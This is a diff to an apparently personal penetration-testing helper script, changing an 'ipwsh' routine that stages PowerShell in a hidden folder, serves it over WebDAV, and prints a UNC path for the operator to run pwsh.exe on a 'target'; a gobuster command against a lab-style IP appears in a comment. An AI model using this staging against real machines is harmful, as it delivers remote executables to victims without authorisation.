@@ -950,7 +950,7 @@ if [ "$1" == "ipwsh" ]; then
     bash -c "$CMD"
   fi
 
-  FPATH="/dev/shm/.fxy/ipwsh"
+  FPATH="/tmp/.fxy/ipwsh"
   if [ -d "$FPATH/pwsh" ]; then
     cd "$FPATH/pwsh"
   else
@@ -968,12 +968,18 @@ if [ "$1" == "ipwsh" ]; then
   fi
 
   echo -e "\n$(tput bold)[*] Run this on your target:"
-  echo "  \\\\$(getIP)\pwsh.exe"
+
+  if [ "$PORT" -eq 80 ]; then
+    echo "  \\\\$(getIP)\DavWWWRoot\pwsh.exe"
+  else
+    echo "  \\\\$(getIP)@$PORT\DavWWWRoot\pwsh.exe"
+  fi
   echo "$(tput sgr0) "
 
   CMD="davserver -H 0.0.0.0 -P $PORT -D $FPATH/pwsh -n"
   echo "> $CMD";
   bash -c "$CMD"
+  exit
 fi
 
 # gobuster dir -u http://10.10.10.191/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
